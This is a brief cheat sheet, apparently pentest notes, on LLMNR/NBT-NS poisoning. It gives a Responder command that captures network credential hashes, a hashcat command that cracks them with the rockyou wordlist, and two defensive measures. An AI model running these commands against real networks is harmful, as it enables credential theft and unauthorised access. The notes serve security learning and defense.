### Responder
LLMNR & NetBios (NBT-NS) Poisoner

`responder -I wlp59s0 -rdw -v`

### Hashcat
Crack hashes

`hashcat -m 5600 hash.txt rockyou.txt`
- where `-m` is the module (`hashcat --help | grep LLMNR`)

### Defense
- Disable LLMNR
- Require Access Control